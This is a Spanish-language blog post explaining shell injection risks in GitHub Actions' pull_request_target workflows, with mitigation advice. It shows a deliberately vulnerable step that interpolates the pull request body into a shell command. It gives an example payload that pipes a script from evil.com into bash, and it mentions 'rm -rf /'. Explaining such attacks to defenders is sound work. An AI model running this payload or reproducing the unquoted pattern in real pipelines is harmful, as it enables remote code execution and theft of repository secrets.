<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Inyección de Shell en CI/CD de GitHub Actions</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Inyección de Shell en CI/CD de GitHub Actions</h1>
</header>
<section data-field="subtitle" class="p-summary">
GitHub Actions ofrece un tipo de evento especial llamado pull_request_target que permite que los flujos de trabajo se ejecuten en…
</section>
<section data-field="body" class="e-content">
<section name="8028" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="7d61" id="7d61" class="graf graf--p graf--leading">Inyección de Shell en CI/CD de GitHub Actions</p><figure name="600a" id="600a" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="0*E2aHSaZhMSRw60Q3" data-width="7952" data-height="5304" data-unsplash-photo-id="mT7lXZPjk7U" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/0*E2aHSaZhMSRw60Q3"><figcaption class="imageCaption">Photo by <a href="https://unsplash.com/es/@flyd2069?utm_source=medium&amp;utm_medium=referral" data-href="https://unsplash.com/es/@flyd2069?utm_source=medium&amp;utm_medium=referral" class="markup--anchor markup--figure-anchor" rel="photo-creator noopener" target="_blank">FLY:D</a> on <a href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" data-href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" class="markup--anchor markup--figure-anchor" rel="photo-source noopener" target="_blank">Unsplash</a></figcaption></figure><p name="f071" id="f071" class="graf graf--p graf-after--figure"><a href="https://github.com/features/actions" data-href="https://github.com/features/actions" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">GitHub Actions</a> ofrece un tipo de evento especial llamado <code class="markup--code markup--p-code">pull_request_target</code> que permite que los flujos de trabajo se ejecuten en solicitudes de extracción desde bifurcaciones con los mismos permisos que el repositorio base. Esto puede ser útil en algunos escenarios, como comentar en solicitudes de extracción o verificar dependencias privadas. Sin embargo, también conlleva riesgos significativos de seguridad y se debe utilizar con precaución.</p><p name="bf07" id="bf07" class="graf graf--p graf-after--p">Uno de los principales riesgos de usar <code class="markup--code markup--p-code">pull_request_target</code> es que expone secretos y variables de entorno a código no confiable de la solicitud de extracción. Esto significa que un atacante puede crear una solicitud de extracción maliciosa que roba o divulga esta información sensible, o las utiliza para realizar acciones no autorizadas en nombre del propietario del repositorio. Por ejemplo, un atacante podría acceder al token de GitHub y crear nuevos problemas, comentarios, versiones o incluso eliminar el repositorio.</p><p name="308e" id="308e" class="graf graf--p graf-after--p">Otro riesgo de usar <code class="markup--code markup--p-code">pull_request_target</code> es que ejecuta el archivo de flujo de trabajo desde la rama base, no desde la rama de la solicitud de extracción. Esto significa que un atacante puede modificar el archivo de flujo de trabajo en la solicitud de extracción e inyectar comandos o scripts arbitrarios que se ejecutarán en el flujo de trabajo de la rama base. Por ejemplo, un atacante podría agregar un paso que ejecuta <code class="markup--code markup--p-code">rm -rf /</code> en la máquina del ejecutor, o ejecutar un shell remoto.</p><p name="9d62" id="9d62" class="graf graf--p graf-after--p">Una de las formas en que un atacante puede inyectar comandos o scripts en el flujo de trabajo es utilizando una inyección de shell. La inyección de shell es una técnica que aprovecha una vulnerabilidad en un programa que ejecuta un comando en un shell sin escapar o validar correctamente la entrada. Por ejemplo, si el flujo de trabajo utiliza un paso como este:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="6b9c" id="6b9c" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">- name: Ejecutar comando<br />  run: <span class="hljs-built_in">echo</span> <span class="hljs-variable">${{ github.event.pull_request.body }</span>}</span></pre><p name="6584" id="6584" class="graf graf--p graf-after--pre">Un atacante podría crear una solicitud de extracción con un cuerpo como este:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="1dc1" id="1dc1" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">Hola mundo; curl https://evil.com/script.sh | bash</span></pre><p name="fa28" id="fa28" class="graf graf--p graf-after--pre">Esto haría que el flujo de trabajo ejecute el comando <code class="markup--code markup--p-code">echo Hola mundo; curl https://evil.com/script.sh | bash</code>, que descargaría y ejecutaría un script malicioso desde una fuente externa.</p><p name="ea42" id="ea42" class="graf graf--p graf-after--p">Para prevenir ataques de inyección de shell, los usuarios de GitHub Actions deben seguir algunas mejores prácticas, como:</p><ul class="postList"><li name="eca0" id="eca0" class="graf graf--li graf-after--p">Escapar o citar la entrada de la solicitud de extracción antes de utilizarla en el flujo de trabajo.</li><li name="ad8a" id="ad8a" class="graf graf--li graf-after--li">Utilizar funciones o acciones integradas para manejar la entrada en lugar de ejecutar comandos en un shell.</li><li name="0578" id="0578" class="graf graf--li graf-after--li">Utilizar herramientas de análisis de código para detectar vulnerabilidades en el código o el flujo de trabajo.</li><li name="4071" id="4071" class="graf graf--li graf-after--li graf--trailing">Utilizar herramientas o servicios de terceros para ejecutar flujos de trabajo en entornos aislados.</li></ul></div></div></section><section name="0b51" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><p name="6b8a" id="6b8a" class="graf graf--p graf--leading graf--trailing">Referencias: <br><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" data-href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://securitylab.github.com/research/github-actions-preventing-pwn-requests/</a><br><a href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/" data-href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/</a></p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@Kfir-G" class="p-author h-card">Kfir Gisman</a> on <a href="https://medium.com/p/83f03a7252ce"><time class="dt-published" datetime="2023-07-04T12:46:06.255Z">July 4, 2023</time></a>.</p><p><a href="https://medium.com/@Kfir-G/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on December 20, 2025.</p></footer></article></body></html>